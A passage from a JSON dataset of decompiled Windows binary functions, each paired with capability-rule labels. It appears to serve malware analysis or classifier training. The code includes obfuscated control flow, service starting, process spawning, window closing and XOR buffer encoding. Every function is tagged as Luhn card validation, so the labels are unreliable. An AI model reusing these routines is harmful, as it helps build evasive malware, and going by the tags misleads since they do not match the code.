((bVar19) || (!bVar19)) goto code_r0x004035b2;\n        pcVar15 = *unaff_EDI;\n        *unaff_EDI = param_3;\n        puVar14 = puVar14 + -*(puVar14 + 0x5f9dff63);\n        in_DS = piStack20;\n        if (-1 < puVar14) break;\n        param_2 = param_2 & 0xffff0000 | CONCAT11(uVar7 | in_EAX, uVar13);\n        param_3 = pcVar15;\n    }\n    if (-1 < pcVar15) {\n        iVar17 = unaff_EDI + 1;\n        *unaff_EDI = in_EAX;\n        piStack20 = param_1;\n        uStack14 = piStack20;\n        goto code_r0x0040360e;\n    }\ncode_r0x004035b2:\n    pcVar15[4] = -0x47;\n    uVar8 = ((uStack16 & 0xff | (in_EAX >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^ CONCAT11(uVar7 | uVar13, uVar13);\n    bVar19 = uVar8 == 0x4001;\n    pcVar15[5] = '@';\n    if ((uVar8 < 0x4001) || (0x4000 < uVar8)) {\n        pcVar15[6] = 'i';\n        if (!bVar19) {\n            piVar12 = (param_1 >> 8 & 0xffff00) << 8 | param_1 & 0xffff;\n            goto code_r0x004035f2;\n        }\n    }\n    else {\n        *(in_EAX + 0x8316dbec) = in_ST0;\n        uStack10 = unaff_EBX;\n        uStack8 = unaff_EBX >> 0x10;\n        uVar7 = in_EAX - 1;\n        uVar13 = 9 < (uVar7 & 0xf) | in_AF;\n        uVar7 = uVar7 + uVar13 * '\\x06';\n        in_EAX = in_EAX - 1 & 0xffffff00 |\n                 uVar7 + (0x90 < (uVar7 & 0xf0) | uVar8 < 0x4001 | uVar13 * (0xf9 < uVar7)) * '`';\n        *param_2 = *param_2 + 0x46c6df84;\n        bVar19 = *param_2 == 0;\n        piVar12 = param_2 & 0xffff0000 | in_ES;\n        pcVar15 = *(unaff_EDI + 0x66 + param_1) * 0x6654b151;\ncode_r0x004035f2:\n        param_1 = piVar12;\n        if (bVar19) goto code_r0x004035f4;\n    }\n    pcVar15[7] = 'f';\n    uStack10 = in_EAX;\n    uStack8 = in_EAX >> 0x10;\ncode_r0x004035f4:\n    iVar17 = CONCAT22(uStack12, in_SS);\n    uStack12 = in_EAX;\n    uStack16 = param_1;\n    uStack14 = param_1 >> 0x10;\n    piStack20._0_2_ = in_DS;\n    piStack20 = param_2;\ncode_r0x0040360e:\n    uVar4 = uStack16;\n    pcVar15[8] = -9;\n    uVar8 = uStack14;\n    piVar12 = CONCAT22(uStack14, uStack16);\n    pcVar10 = CONCAT22(uStack10, uStack12);\n    pcVar15[9] = -0x28;\n    pcVar15[10] = -0x1b;\n    uStack12 = piStack20;\n    uStack10 = piStack20 >> 0x10;\n    uStack16 = iVar17;\n    uStack14 = iVar17 >> 0x10;\n    do {\n        uVar9 = uStack10;\n        uVar5 = uStack12;\n        ppcVar18 = CONCAT22(uStack14, uStack16);\n        pcVar15[0xb] = 'b';\n        uStack12 = pcVar10;\n        uVar6 = uStack12;\n        uStack10 = pcVar10 >> 0x10;\n        uStack16 = uVar5;\n        uStack14 = uVar9;\n        uVar9 = (CONCAT11((pcVar10 >> 8) + -0x2b, pcVar10) ^ 0x3d) + 0x7c28 ^ (uVar5 & 0xff | (uVar5 >> 8 | uVar5) << 8)\n        ;\n        bVar19 = (POPCOUNT(uVar9 + 0xbfff & 0xff) & 1U) == 0;\n        pcVar15[0xc] = -0xd;\n        uStack12 = uVar4;\n        if ((bVar19) || (uVar6 = uStack12,  uStack10 = uVar8,  !bVar19)) {\n            uStack12 = uVar6;\n            pcVar15[0xd] = 'V';\n            pcVar16 = pcVar15;\n            if (0x4000 < uVar9) {\n                uStack10 = uVar5;\n                goto code_r0x004036a9;\n            }\n        }\n        else {\ncode_r0x004036a9:\n            pcVar10 = pcVar10 | 0x1b8c0f56;\n            *pcVar10 = *pcVar10 + pcVar10;\n            pcVar1 = pcVar15 + 0x98;\n            cVar2 = *pcVar1;\n            cVar11 = pcVar10 >> 8;\n            *pcVar1 = *pcVar1 + cVar11;\n            pcVar16 = pcVar15 + 0x46;\n            if (SCARRY1(cVar2, cVar11) != *pcVar1 < '\\0') {\n                out(0xc4, pcVar10);\n                piStack20 = uStack10 & 0xffffff00 | uStack10 ^ uVar4;\n                *ppcVar18 = pcVar10;\n                ppcVar18 = ppcVar18 + 1;\n                uStack16 = in_SS;\n                uStack12 = piStack20;\n            }\n        }\n        pcVar16[0xe] = 'Y';\n        bVar19 = (POPCOUNT((uVar4 - 1 & ppcVar18 | 0x61be) & 0xff) & 1U) == 0;\n        pcVar16[0xf] = 'z';\n        if ((bVar19) || (!bVar19)) goto code_r0x00403701;\n        pcVar15 = *ppcVar18;\n        *ppcVar18 = pcVar16;\n        puVar14 = puVar14 + -*(puVar14 + 0x5f9dff63);\n    } while (puVar14 < 0);\n    bVar19 = false;\n    bVar20 = pcVar15 == NULL;\n    if (-1 < pcVar15) {\n        piStack20 = piVar12;\n        fcn.00403510();\n        if ((bVar19 || bVar20) || (!bVar19 && !bVar20)) {\n            arg_ch = *(puVar14 + -4);\n        }\n        else {\n            *(ppcVar18 + -0x75) = *(ppcVar18 + -0x75) - &piStack20;\n            arg_ch = extraout_EDX;\n        }\n        fcn.00402d80(puVar14 + -0x68, arg_ch, 0x411144, 0x13000);\n        puVar3 = *(puVar14 + 0xc);\n        **(puVar14 + 8) = 0x411144;\n        *puVar3 = 0x13000;\n        return;\n    }\ncode_r0x00403701:\n    **(puVar14 + 0xc) = 0x10;\n    return;\n}\n",
        "token_count": 2468
    },
    "00403710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040376e) overlaps instruction at (ram,0x0040376c)\n// \n// WARNING: Removing unreachable block (ram,0x00403740)\n// WARNING: Removing unreachable block (ram,0x0040374d)\n// WARNING: Removing unreachable block (ram,0x004036fe)\n\nunkbyte10 __cdecl fcn.00403710(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint extraout_EDX;\n    uint arg_ch_00;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    unkbyte10 Var5;\n    uchar *puStack120;\n    uint *puStack116;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar3 = false;\n    bVar4 = true;\n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puStack116 = &var_4h;\n    puStack120 = &var_68h;\n    fcn.00403510();\n    arg_ch_00 = var_4h;\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        *(puVar2 + -0x72) = *(puVar2 + -0x72) - &puStack120;\n        arg_ch_00 = extraout_EDX;\n    }\n    Var5 = fcn.00402d80(&var_68h, arg_ch_00, 0x411144, 0x13000);\n    *arg_8h = 0x411144;\n    *arg_ch = 0x13000;\n    return Var5;\n}\n",
        "token_count": 478
    },
    "004037a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004037bd) overlaps instruction at (ram,0x004037bc)\n// \n\nuint __cdecl fcn.004037a0(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint8_t in_AL;\n    int32_t iVar3;\n    int32_t iVar4;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    uint8_t *unaff_EDI;\n    bool in_CF;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    \n    if (!in_CF) {\n        if (in_CF) goto code_r0x004037ad;\n    }\n    in_AL = arg_ch;\ncode_r0x004037ad:\n    cVar1 = in_AL - *unaff_EDI;\n    iVar3 = func_0x1018972f((in_NT & 1) * 0x4000 | SBORROW1(in_AL, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                            (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                            ((POPCOUNT(cVar1) & 1U) == 0) * 4 | in_AL < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                            (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    *(iVar3 + -1) = *(iVar3 + -1) | unaff_EBX + 0x4d8b0c45 >> 8;\n    *(unaff_EDI + 1) = *(unaff_EDI + 1) + unaff_EBX + 0x4d8b0c45;\n    *(iVar3 + 0x51) = *(iVar3 + 0x51) + extraout_DL;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar3 == 0) {\n        return 0;\n    }\n    iVar4 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar3, 0, 0);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar4 == 0) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0x420) {\n            iVar4 = (*pcVar2)();\n            if (iVar4 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar3);\n    return 1;\n}\n",
        "token_count": 713
    },
    "00403830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403830(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint var_4h;\n    \n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)();\n    uVar1 = fcn.004037a0(arg_8h_00, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "00403aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403aa0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00403b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403b00(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403d00(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    bool bVar7;\n    uchar uVar8;\n    float10 fVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405270;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uVar8 = iVar1 < 0;\n    bVar7 = iVar1 == 0;\n    if (bVar7) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x424538);\n    if ((!bVar7) && (bVar7)) {\n        uVar8 = &stack0xfffffd99 < 0;\n    }\n    fVar9 = (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    if ((!uVar8) && (uVar8)) {\n        *(iVar1 + 0x1c) = fVar9;\n        iVar1 = iVar1 + 5;\n    }\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x42454c);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x0040411b:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00404127:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x004040e2:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00404127;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00403f1e:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403b00(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x424560);\n                        if (iVar1 != 0) goto joined_r0x00403f1e;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x004040c7:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x0040411b;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x004040c7;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00403b00(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00403c20(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x004040e2;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2562
    },
    "00404240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nchar * __cdecl fcn.00404240(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    if ((0x107 < &stack0xfffffffc) && (0x107 >= &stack0xfffffffc)) {\n        pcVar1 = in_EAX + 1;\n        if (&stack0xfffffeec < *in_EAX || pcVar1 == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar1 = *pcVar1 + pcVar1;\n        return pcVar1;\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 0x1;\n    }\n    var_108h = 0;\n    puVar3 = &var_107h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x424508);\n    if (iVar2 != 0) {\n        return 0x1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x4041c0, 0);\n    iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return NULL;\n}\n",
        "token_count": 508
    },
    "00404350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get Program Files directory"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004044f1) overlaps instruction at (ram,0x004044ec)\n// \n// WARNING: Removing unreachable block (ram,0x00404485)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404350(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    uchar uVar7;\n    uchar uVar8;\n    char cVar9;\n    char cVar10;\n    uchar uVar11;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    cVar10 = '\\0';\n    cVar9 = '\\0';\n    cVar3 = fcn.00401b70();\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        *extraout_EDX = *extraout_EDX + extraout_EDX;\n        *(unaff_EBX + 0x66) = *(unaff_EBX + 0x66) + cVar3;\n    }\n    else {\n        iVar5 = fcn.00403b30();\n        if (iVar5 == 0) {\n            return;\n        }\n    }\n    lpszPath = 0;\n    puVar6 = &var_25fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    iVar5 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n    if (iVar5 != 0) {\n        fcn.00402cb0();\n        lpCommandLine = 0;\n        puVar6 = &var_15bh;\n        for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar6 = 0;\n        *(puVar6 + 2) = 0;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x4244e0, &lpszPath, 0x4244c0, 3);\n        pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n        var_14h = 0;\n        do {\n            puVar6 = &var_58h;\n            for (iVar5 = 0x11; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            hProcess = 0;\n            var_58h = 0x44;\n            var_ch = 0;\n            var_2ch = 1;\n            lParam = 0;\n            var_28h._0_2_ = 0;\n            var_4h = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n            if (iVar5 == 0) {\n                return;\n            }\n            (*pcVar1)(3000);\n            (*_sym.imp.USER32.dll_EnumWindows)(fcn.00404240, lParam);\n            uVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n            uVar7 = uVar4 < 0x102;\n            uVar11 = SBORROW4(uVar4, 0x102);\n            uVar8 = uVar4 == 0x102;\n            iVar5 = extraout_ECX;\n            if (uVar8) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess);\n                iVar5 = extraout_ECX_00;\n            }\n            pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n            if ((!uVar7 && !uVar8) && (uVar7 || uVar8)) {\n                if (uVar11) {\n                    *(iVar5 + 0x50e0eb) = *(iVar5 + 0x50e0eb) + uVar4;\n                    pcVar1 = pcVar1 + -0x45;\n                    *pcVar1 = *pcVar1 + (uVar4 >> 8);\n                    return;\n                }\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n            (*pcVar2)(hProcess);\n            var_14h = var_14h + 1;\n        } while (var_14h < 1);\n    }\n    return;\n}\n",
        "token_count": 1229
    },
    "00404580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045b3) overlaps instruction at (ram,0x004045b2)\n// \n\nuint32_t __cdecl fcn.00404580(int32_t arg_8h, int32_t arg_ch, int32_t ptr, uint32_t nitems)\n\n{\n    uchar uVar1;\n    int32_t in_ECX;\n    uint8_t uVar2;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    uchar *unaff_EDI;\n    uchar *puVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    ushort uVar8;\n    \n    uVar3 = 0;\n    bVar5 = false;\n    bVar7 = false;\n    bVar6 = nitems == 0;\n    if (0 < nitems) {\n        do {\n            uVar2 = in_ECX;\n            if ((bVar7) || (!bVar7)) {\n                uVar2 = *(uVar3 + ptr);\n                puVar4 = unaff_EDI;\n            }\n            else {\n                puVar4 = unaff_EDI + 1;\n                uVar1 = in(in_EDX);\n                *unaff_EDI = uVar1;\n                if (!bVar5 && !bVar6) {\n                    if (sym.imp.MSVCRT.dll_fopen + bVar5 + nitems != NULL) {\n                        uVar8 = SUB42(sym.imp.MSVCRT.dll_fopen + bVar5 + nitems, 0);\n                        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar8);\n                        (*_sym.imp.MSVCRT.dll_fflush)(uVar8);\n                        (*_sym.imp.MSVCRT.dll_fclose)(uVar8);\n                        return 1;\n                    }\n                    return 0;\n                }\n            }\n            uVar2 = nitems ^ uVar2 ^ *(uVar3 % arg_ch + arg_8h);\n            in_EDX = uVar3 % arg_ch & 0xff00U | uVar2;\n            *(uVar3 + ptr) = uVar2;\n            uVar3 = uVar3 + 1;\n            bVar5 = uVar3 < nitems;\n            bVar7 = SBORROW4(uVar3, nitems);\n            bVar6 = uVar3 == nitems;\n            in_ECX = ptr;\n            unaff_EDI = puVar4;\n        } while (uVar3 < nitems);\n    }\n    return nitems;\n}\n",
        "token_count": 561
    },
    "00404610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404610(uint filename, uint mode)\n\n{\n    int32_t iVar1;\n    uint in_stack_0000000c;\n    uchar in_stack_00000010;\n    ushort uVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)(in_stack_0000000c, 1, in_stack_00000010, uVar2);\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar2);\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar2);\n    return 1;\n}\n",
        "token_count": 170
    },
    "004046a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046a0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00401200();\n        fcn.004021f0();\n        fcn.00404350();\n        if (*0x424608 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404a70();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 145
    },
    "00404f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
